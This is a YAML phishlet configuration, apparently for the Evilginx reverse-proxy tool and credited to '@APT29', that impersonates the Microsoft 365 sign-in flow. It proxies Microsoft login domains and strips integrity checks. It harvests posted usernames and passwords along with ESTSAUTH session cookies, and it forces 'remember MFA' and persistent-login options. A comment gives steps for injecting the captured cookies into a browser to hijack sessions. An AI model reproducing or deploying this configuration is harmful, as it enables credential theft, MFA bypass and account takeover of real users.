name: 'o365'
author: '@APT29'
min_ver: '2.4.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'cloud', orig_sub: 'cloud', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'mysignins', orig_sub: 'mysignins', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}

custom_headers:
      - {name: 'Access-Control-Allow-Origin', value: 'https://login.googledevelopertoolkit.com', direction: 'response'}
      - {name: 'Access-Control-Allow-Methods', value: 'GET, POST', direction: 'response'}
      - {name: 'Access-Control-Allow-Headers', value: 'Content-Type', direction: 'response'}
      - {name: 'Access-Control-Allow-Credentials', value: 'true', direction: 'response'}
  
sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.googledevelopertoolkit.com', orig_sub: 'login', domain: 'googledevelopertoolkit.com', search: 'integrity="sha384-[^"]*"', replace: '', mimes: ['text/html', 'application/javascript']}
  - {triggers_on: 'login.googledevelopertoolkit.com', orig_sub: 'login', domain: 'googledevelopertoolkit.com', search: 'crossorigin="https://login.googledevelopertoolkit.com"', replace: '', mimes: ['text/html', 'application/javascript']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
  - domain: 'login.microsoftonline.com'
    keys: ['SignInStateCookie']      


# INJECT COOKIES
# --------------
# 
# Browse the url https://login.microsoftonline.com
# inject the capture cookies 
# Refresh the browser



credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'     
auth_urls:
  - '/common/SAS/ProcessAuth'
  - '/kmsi'
login:
  domain: 'login.microsoftonline.com'
  path: '/' 
force_post:
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
  - path: '/kmsi'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
